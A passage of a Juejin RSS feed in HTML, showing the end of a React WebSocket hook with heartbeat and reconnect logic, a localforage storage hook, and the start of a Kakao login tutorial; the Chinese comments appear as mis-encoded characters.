  <span class="hljs-keyword">const</span> reconnectAttempts = useRef&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">0</span>) <span class="hljs-comment">// å·²ç»å°è¯•é‡è¿äº†çš„æ¬¡æ•°</span>
  <span class="hljs-keyword">const</span> error = useRef&lt;<span class="hljs-title class_">Event</span>&gt;() <span class="hljs-comment">// error</span>
  <span class="hljs-keyword">const</span> curUrlRef = useRef&lt;<span class="hljs-built_in">string</span>&gt;() <span class="hljs-comment">// curUrlRef</span>

  <span class="hljs-keyword">let</span> <span class="hljs-attr">heartBeatTimer</span>: <span class="hljs-title class_">TimerType</span> = <span class="hljs-literal">undefined</span> <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹çš„å®šæ—¶å™¨</span>
  <span class="hljs-keyword">let</span> <span class="hljs-attr">reconnectTimer</span>: <span class="hljs-title class_">TimerType</span> = <span class="hljs-literal">undefined</span> <span class="hljs-comment">// é‡è¿çš„å®šæ—¶å™¨</span>

  <span class="hljs-comment">// æ˜¯å¦å·²è¿æ¥</span>
  <span class="hljs-keyword">const</span> isConnected = <span class="hljs-title function_">useMemo</span>(
    <span class="hljs-function">() =&gt;</span> socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>,
    [socket],
  )

  <span class="hljs-comment">// è¿æ¥</span>
  <span class="hljs-keyword">const</span> connect = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">curUrl: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
      <span class="hljs-comment">// å¦‚æœå·²å­˜åœ¨ WebSocket å®ä¾‹ï¼Œåˆ™å…ˆå…³é—­å®ƒ</span>
      <span class="hljs-keyword">if</span> (socket) {
        socket.<span class="hljs-property">current</span>?.<span class="hljs-title function_">close</span>()
      }

      <span class="hljs-keyword">if</span> (curUrl &amp;&amp; !curUrlRef.<span class="hljs-property">current</span>) {
        curUrlRef.<span class="hljs-property">current</span> = curUrl
      }

      <span class="hljs-keyword">const</span> socketInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(curUrl || url!)
      socket.<span class="hljs-property">current</span> = socketInstance
      socketInstance.<span class="hljs-property">onopen</span> = onopen
      socketInstance.<span class="hljs-property">onmessage</span> = onmessage
      socketInstance.<span class="hljs-property">onclose</span> = onclose
      socketInstance.<span class="hljs-property">onerror</span> = onerror
    },
    [url],
  )

  <span class="hljs-comment">// æ¥æ”¶æ¶ˆæ¯</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onmessage</span> = (<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt; {
    <span class="hljs-title function_">setLastMessage</span>(data)
  }

  <span class="hljs-comment">// è¿æ¥æˆåŠŸ</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onopen</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿æ¥æˆåŠŸ'</span>)
    <span class="hljs-comment">// é‡ç½®é‡è¿æ¬¡æ•°</span>
    reconnectAttempts.<span class="hljs-property">current</span> = <span class="hljs-number">0</span>
    <span class="hljs-comment">// å¼€å§‹å¿ƒè·³æ£€æµ‹</span>
    <span class="hljs-title function_">checkHealthStart</span>()
  }

  <span class="hljs-comment">// è¿æ¥æ–­å¼€</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onclose</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿æ¥æ–­å¼€'</span>)
    <span class="hljs-comment">// ç»“æŸå¿ƒè·³æ£€æµ‹</span>
    <span class="hljs-title function_">checkHealthEnd</span>()
  }

  <span class="hljs-comment">// è¿æ¥å‡ºé”™</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onerror</span> = (<span class="hljs-params">e: Event</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿æ¥å‡ºé”™'</span>)
    error.<span class="hljs-property">current</span> = e
    <span class="hljs-comment">// ç»“æŸå¿ƒè·³æ£€æµ‹</span>
    <span class="hljs-title function_">checkHealthEnd</span>()
    <span class="hljs-comment">// é‡è¿</span>
    <span class="hljs-title function_">reconnect</span>()
  }

  <span class="hljs-comment">// æ–­å¼€è¿æ¥</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">disconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¿æ¥æ–­å¼€'</span>)
    socket.<span class="hljs-property">current</span>?.<span class="hljs-title function_">close</span>()
    <span class="hljs-comment">// ç»“æŸå¿ƒè·³æ£€æµ‹</span>
    <span class="hljs-title function_">checkHealthEnd</span>()
  }

  <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">data: SendData</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å³å°†å‘é€çš„æ•°æ®'</span>, data)
    <span class="hljs-keyword">if</span> (socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çœŸå®å‘é€çš„æ•°æ®'</span>, data)
      socket.<span class="hljs-property">current</span>?.<span class="hljs-title function_">send</span>(data)
    }
  }

  <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹å¼€å§‹</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkHealthStart</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¿ƒè·³æ£€æµ‹å¼€å§‹'</span>)
    <span class="hljs-title function_">checkHealthEnd</span>()
    heartBeatTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) {
        <span class="hljs-title function_">sendMessage</span>(
          heartBeatSendData ||
            <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
              <span class="hljs-attr">type</span>: <span class="hljs-string">'ping'</span>,
              <span class="hljs-attr">data</span>: heartBeatData,
            }),
        )
        <span class="hljs-title function_">checkHealthStart</span>()
      }
    }, heartBeatInterval)
  }

  <span class="hljs-comment">// å¿ƒè·³æ£€æµ‹ç»“æŸ</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkHealthEnd</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¿ƒè·³æ£€æµ‹ç»“æŸ'</span>)
    <span class="hljs-built_in">clearTimeout</span>(heartBeatTimer)
    heartBeatTimer = <span class="hljs-literal">undefined</span>
  }

  <span class="hljs-comment">// é‡è¿</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¼€å§‹é‡è¿'</span>)

    <span class="hljs-comment">// æ²¡æœ‰è¿æ¥å¹¶ä¸”æ²¡æœ‰è¾¾åˆ°é‡è¿æ¬¡æ•°</span>
    <span class="hljs-keyword">if</span> (
      socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> !== <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span> &amp;&amp;
      reconnectAttempts.<span class="hljs-property">current</span> &lt;= maxReconnectAttempts
    ) {
      <span class="hljs-comment">// ä½¿ç”¨é€’å¢çš„å»¶è¿Ÿæ¥é¿å…é¢‘ç¹é‡è¿</span>
      reconnectTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">connect</span>(curUrlRef.<span class="hljs-property">current</span> || url!)
      }, reconnectInterval * reconnectAttempts.<span class="hljs-property">current</span> + <span class="hljs-number">1</span>)
      <span class="hljs-comment">// å¢åŠ é‡è¿å°è¯•æ¬¡æ•°</span>
      reconnectAttempts.<span class="hljs-property">current</span> += <span class="hljs-number">1</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">clearTimeout</span>(reconnectTimer)
      reconnectTimer = <span class="hljs-literal">undefined</span>
    }
  }

  <span class="hljs-comment">// å–æ¶ˆé‡è¿</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">cancelReconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-built_in">clearTimeout</span>(reconnectTimer)
    reconnectTimer = <span class="hljs-literal">undefined</span>
  }

  <span class="hljs-keyword">return</span> {
    socket,
    lastMessage,
    isConnected,
    error,
    connect,
    disconnect,
    reconnect,
    checkHealthStart,
    sendMessage,
    cancelReconnect,
  }
}
</code></pre>
<h3 data-id="heading-15">useLocalforage</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> localforage <span class="hljs-keyword">from</span> <span class="hljs-string">'localforage'</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@desc</span> localForage æ˜¯ä¸€ä¸ª JavaScript åº“ï¼Œé€šè¿‡ç®€å•ç±»ä¼¼ localStorage API çš„å¼‚æ­¥å­˜å‚¨æ¥æ”¹è¿›ä½ çš„ Web åº”ç”¨ç¨‹åºçš„ç¦»çº¿ä½“éªŒã€‚å®ƒèƒ½å­˜å‚¨å¤šç§ç±»å‹çš„æ•°æ®ï¼Œè€Œä¸ä»…ä»…æ˜¯å­—ç¬¦ä¸²ã€‚
  localForage æœ‰ä¸€ä¸ªä¼˜é›…é™çº§ç­–ç•¥ï¼Œè‹¥æµè§ˆå™¨ä¸æ”¯æŒ IndexedDB æˆ– WebSQLï¼Œåˆ™ä½¿ç”¨ localStorageã€‚åœ¨æ‰€æœ‰ä¸»æµæµè§ˆå™¨ä¸­éƒ½å¯ç”¨ï¼šChromeï¼ŒFirefoxï¼ŒIE å’Œ Safariï¼ˆåŒ…æ‹¬ Safari Mobileï¼‰ã€‚
  localForage æä¾›å›è°ƒ API åŒæ—¶ä¹Ÿæ”¯æŒ ES6 Promises APIï¼Œä½ å¯ä»¥è‡ªè¡Œé€‰æ‹©ã€‚
  * <span class="hljs-doctag">@return</span> getItem è·å–æŸä¸ªkeyçš„å€¼
  * <span class="hljs-doctag">@return</span> setItem è®¾ç½®æŸä¸ªkeyçš„å€¼
  * <span class="hljs-doctag">@return</span> removeItem ç§»é™¤æŸä¸ªkeyçš„å€¼
  * <span class="hljs-doctag">@return</span> clearItems ç§»é™¤æ‰€æœ‰keyçš„å€¼ï¼Œæ­¤æ–¹æ³•å°†ä¼šåˆ é™¤ç¦»çº¿ä»“åº“ä¸­çš„æ‰€æœ‰å€¼ã€‚è°¨æ…ä½¿ç”¨æ­¤æ–¹æ³•ã€‚
  * <span class="hljs-doctag">@return</span> itemsLength è·å–ç¦»çº¿ä»“åº“ä¸­çš„ key çš„æ•°é‡ï¼ˆå³æ•°æ®ä»“åº“çš„â€œé•¿åº¦â€ï¼‰
  * <span class="hljs-doctag">@return</span> key æ ¹æ® key çš„ç´¢å¼•è·å–å…¶å
  * <span class="hljs-doctag">@return</span> keys è·å–æ•°æ®ä»“åº“ä¸­æ‰€æœ‰çš„ keyï¼ŒåŒ…å«æ‰€æœ‰ key åçš„æ•°ç»„
 */</span>
<span class="hljs-keyword">const</span> useLocalforage = &lt;T = <span class="hljs-built_in">any</span>&gt;(): [
  <span class="hljs-attr">getItem</span>: <span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;T | <span class="hljs-literal">null</span>&gt;, <span class="hljs-comment">// è·å–æŸä¸ªkeyçš„å€¼</span>
  <span class="hljs-attr">setItem</span>: <span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span>, value: T</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;, <span class="hljs-comment">// è®¾ç½®æŸä¸ªkeyçš„å€¼</span>
  <span class="hljs-attr">removeItem</span>: <span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt;, <span class="hljs-comment">// ç§»é™¤æŸä¸ªkeyçš„å€¼</span>
  <span class="hljs-attr">clearItems</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt;, <span class="hljs-comment">// ç§»é™¤æ‰€æœ‰keyçš„å€¼ï¼Œæ­¤æ–¹æ³•å°†ä¼šåˆ é™¤ç¦»çº¿ä»“åº“ä¸­çš„æ‰€æœ‰å€¼ã€‚è°¨æ…ä½¿ç”¨æ­¤æ–¹æ³•ã€‚</span>
  <span class="hljs-attr">itemsLength</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;, <span class="hljs-comment">// è·å–ç¦»çº¿ä»“åº“ä¸­çš„ key çš„æ•°é‡ï¼ˆå³æ•°æ®ä»“åº“çš„â€œé•¿åº¦â€ï¼‰</span>
  <span class="hljs-attr">key</span>: <span class="hljs-function">(<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt;, <span class="hljs-comment">// æ ¹æ® key çš„ç´¢å¼•è·å–å…¶å</span>
  <span class="hljs-attr">keys</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt;, <span class="hljs-comment">// è·å–æ•°æ®ä»“åº“ä¸­æ‰€æœ‰çš„ keyï¼ŒåŒ…å«æ‰€æœ‰ key åçš„æ•°ç»„</span>
] =&gt; {
  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> è·å–æŸä¸ªkeyçš„å€¼
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} key è¦è·å–çš„key
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;T | null&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œå€¼çš„ç±»å‹æ˜¯Tæˆ–è€…æ˜¯null
   */</span>
  <span class="hljs-keyword">const</span> getItem = (<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T | <span class="hljs-literal">null</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-property">getItem</span>&lt;T&gt;(key)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> è®¾ç½®æŸä¸ªkeyçš„å€¼
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} key è¦è®¾ç½®çš„key
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">T</span>} value è¦è®¾ç½®çš„keyçš„å€¼
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;T&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œå€¼çš„ç±»å‹æ˜¯T
   */</span>
  <span class="hljs-keyword">const</span> setItem = (<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">value</span>: T): <span class="hljs-title class_">Promise</span>&lt;T&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-property">setItem</span>&lt;T&gt;(key, value)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»ç¦»çº¿ä»“åº“ä¸­åˆ é™¤ key å¯¹åº”çš„å€¼
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} key è¦åˆ é™¤çš„key
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;Boolean&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œå€¼çš„ç±»å‹æ˜¯Booleanï¼Œä¸ºäº†ä¿è¯ä¸é˜»å¡ä»£ç æ‰§è¡Œï¼Œç§»é™¤æ—¶æŠ¥é”™ä¼šè¿”å›Promise&lt;false&gt;ï¼Œå„ä½å¤§ä½¬å¯ä»¥æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ˜¯å¦ç§»é™¤æˆåŠŸ
   */</span>
  <span class="hljs-keyword">const</span> removeItem = (<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">removeItem</span>(key)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»æ•°æ®åº“ä¸­åˆ é™¤æ‰€æœ‰çš„ keyï¼Œé‡ç½®æ•°æ®åº“.å°†ä¼šåˆ é™¤ç¦»çº¿ä»“åº“ä¸­çš„æ‰€æœ‰å€¼ã€‚è°¨æ…ä½¿ç”¨æ­¤æ–¹æ³•
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;Boolean&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œå€¼çš„ç±»å‹æ˜¯Booleanï¼Œä¸ºäº†ä¿è¯ä¸é˜»å¡ä»£ç æ‰§è¡Œï¼Œç§»é™¤æ—¶æŠ¥é”™ä¼šè¿”å›Promise&lt;false&gt;ï¼Œå„ä½å¤§ä½¬å¯ä»¥æ ¹æ®è¿”å›å€¼æ¥åˆ¤æ–­æ˜¯å¦ç§»é™¤æˆåŠŸ
   */</span>
  <span class="hljs-keyword">const</span> clearItems = (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">clear</span>()
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> è·å–ç¦»çº¿ä»“åº“ä¸­çš„ key çš„æ•°é‡ï¼ˆå³æ•°æ®ä»“åº“çš„â€œé•¿åº¦â€ï¼‰
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;number&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œå€¼çš„ç±»å‹æ˜¯number
   */</span>
  <span class="hljs-keyword">const</span> itemsLength = (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">length</span>()
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">numberOfKeys</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(numberOfKeys))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> æ ¹æ® key çš„ç´¢å¼•è·å–å…¶å
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} index è¦åˆ é™¤çš„key
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;string&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œkeyåï¼Œå€¼çš„ç±»å‹æ˜¯string
   */</span>
  <span class="hljs-keyword">const</span> key = (<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">key</span>(index)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">keyName</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(keyName))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> è·å–æ•°æ®ä»“åº“ä¸­æ‰€æœ‰çš„keyåæ•°ç»„
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;string[]&gt;</span>} è¿”å›ä¸€ä¸ªPromiseï¼Œkeyåæ•°ç»„ï¼Œå€¼çš„ç±»å‹æ˜¯string[]
   */</span>
  <span class="hljs-keyword">const</span> keys = (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">keys</span>()
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">keys</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(keys))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-keyword">return</span> [getItem, setItem, removeItem, clearItems, itemsLength, key, keys]
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useLocalforage
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¸¦ä½ ç©è½¬kakaoç™»å½• æ¥å…¥æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7589092567544250377</link>    <guid>https://juejin.cn/post/7589092567544250377</guid>    <pubDate>2025-12-29T10:03:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589092567544250377" data-draft-id="7588917508206100530" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¸¦ä½ ç©è½¬kakaoç™»å½• æ¥å…¥æ•™ç¨‹ "/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-29T10:03:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xq9527"/> <meta itemprop="url" content="https://juejin.cn/user/1239904848712184"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¸¦ä½ ç©è½¬kakaoç™»å½• æ¥å…¥æ•™ç¨‹ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904848712184/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xq9527
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T10:03:07.000Z" title="Mon Dec 29 2025 10:03:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media 